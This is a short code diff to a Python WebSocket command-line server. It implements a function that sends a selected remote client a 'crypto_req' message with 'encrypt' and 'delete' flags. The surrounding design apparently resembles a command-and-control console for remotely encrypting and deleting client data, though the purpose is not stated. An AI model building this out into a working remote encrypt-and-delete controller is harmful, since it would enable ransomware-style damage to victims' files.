@@ -117,7 +117,6 @@ class WebSocketCLIServer:
                     encrypt = "--encrypt" in args
                     delete = "--delete" in args
                     await self.__send_crypto_req(encrypt, delete)
-                    print("Not implemented yet", encrypt, delete)
 
                 case ["encryptionreq"]:
                     await self.__send_encryption_req()
@@ -221,8 +220,14 @@ class WebSocketCLIServer:
     @check_selected_client
     async def __send_crypto_req(self, encrypt=False, delete=False):
         """Send a cryptographic setup request to the selected client."""
-        #TODO: Implement crypto request
-        pass
+        message = {
+            "type": "crypto_req",
+            "data": {
+                "encrypt": encrypt,
+                "delete": delete
+            }
+        }
+        await self.__selected_client.send_message(json.dumps(message))
 
     @check_selected_client
     async def __send_encryption_req(self):
